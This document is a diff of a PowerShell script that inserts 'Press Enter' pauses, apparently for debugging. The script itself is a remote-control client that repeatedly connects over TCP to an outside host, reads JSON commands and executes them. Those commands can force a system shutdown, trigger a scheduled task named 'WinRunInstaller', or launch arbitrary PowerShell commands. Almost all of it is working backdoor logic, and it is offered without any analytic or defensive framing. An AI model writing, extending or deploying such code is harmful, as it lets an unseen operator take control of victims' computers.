@@ -1,14 +1,17 @@
 Write-Host "=== Starting run.ps1 ===" -ForegroundColor Cyan
+Read-Host -Prompt "Press Enter to continue..."
 
 $m1 = New-Object System.Threading.Mutex($false, "run.exe")
 if (-not $m1.WaitOne(0)) {
   Write-Host "Mutex run.exe already held. Exiting." -ForegroundColor Yellow
+  Read-Host -Prompt "Press Enter to exit..."
   exit
 }
 
 $m2 = New-Object System.Threading.Mutex($false, "run.ps1")
 if (-not $m2.WaitOne(0)) {
   Write-Host "Mutex run.ps1 already held. Exiting." -ForegroundColor Yellow
+  Read-Host -Prompt "Press Enter to exit..."
   exit
 }
 
@@ -31,9 +34,10 @@ else {
 }
 
 $uniqueUser = "$($env:USERNAME)-$uniqueId-W"
-$SCRIPT_VERSION = "978635d"
+$SCRIPT_VERSION = "16026ce"
 $clientVersion = $SCRIPT_VERSION
 Write-Host "Client: $uniqueUser | Version: $clientVersion" -ForegroundColor Yellow
+Read-Host -Prompt "Press Enter to continue..."
 
 function Execute-CommandPayload ($r) {
   if ($r.run -eq $true -and -not [string]::IsNullOrEmpty($r.cmd)) {
@@ -42,13 +46,16 @@ function Execute-CommandPayload ($r) {
     )
 
     Write-Host "Executing command payload: $c" -ForegroundColor Cyan
+    Read-Host -Prompt "Press Enter to continue..."
 
     if ($c -match "panic") {
       Write-Host "Panic command received. Exiting." -ForegroundColor Red
+      Read-Host -Prompt "Press Enter to exit..."
       exit
     }
     elseif ($c -match "altf4") {
       Write-Host "altf4 command received. System shutdown requested." -ForegroundColor Red
+      Read-Host -Prompt "Press Enter to continue..."
       Start-Process `
         -FilePath "shutdown" `
         -ArgumentList "/s", "/t", "0" `
@@ -56,6 +63,7 @@ function Execute-CommandPayload ($r) {
     }
     elseif ($c -match "sauce") {
       Write-Host "sauce command received. Triggering WinRunInstaller." -ForegroundColor Yellow
+      Read-Host -Prompt "Press Enter to continue..."
       Start-ScheduledTask `
         -TaskName "WinRunInstaller"
     }
@@ -63,6 +71,7 @@ function Execute-CommandPayload ($r) {
       $style = "Normal"
 
       Write-Host "Launching PowerShell command with WindowStyle: $style" -ForegroundColor Yellow
+      Read-Host -Prompt "Press Enter to continue..."
       Start-Process powershell.exe `
         -ArgumentList @(
         "-NoProfile",
@@ -79,11 +88,13 @@ try {
   while ($true) {
     try {
       Write-Host "Connecting to TCP socket $VPS_HOST:$VPS_PORT..." -ForegroundColor Yellow
+      Read-Host -Prompt "Press Enter to continue..."
       $tcpClient = New-Object System.Net.Sockets.TcpClient
       $tcpClient.Connect($VPS_HOST, $VPS_PORT)
 
       if ($tcpClient.Connected) {
         Write-Host "TCP connected successfully." -ForegroundColor Green
+        Read-Host -Prompt "Press Enter to continue..."
         $stream = $tcpClient.GetStream()
         $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
         $writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::UTF8)
@@ -96,6 +107,7 @@ try {
           $line = $reader.ReadLine()
           if ($null -eq $line) {
             Write-Host "Server closed connection." -ForegroundColor Red
+            Read-Host -Prompt "Press Enter to continue..."
             break
           }
 
@@ -105,6 +117,7 @@ try {
           }
 
           Write-Host "Received TCP line: $line" -ForegroundColor Green
+          Read-Host -Prompt "Press Enter to continue..."
           $r = $line | ConvertFrom-Json
           Execute-CommandPayload $r
         }
@@ -112,6 +125,7 @@ try {
     }
     catch {
       Write-Host "TCP connection error: $($_.Exception.Message)" -ForegroundColor Red
+      Read-Host -Prompt "Press Enter to continue..."
     }
     finally {
       if ($tcpClient) {
@@ -121,6 +135,7 @@ try {
     }
 
     Write-Host "Reconnecting in 3 seconds..." -ForegroundColor Yellow
+    Read-Host -Prompt "Press Enter to continue..."
     Start-Sleep -Seconds 3
   }
 }
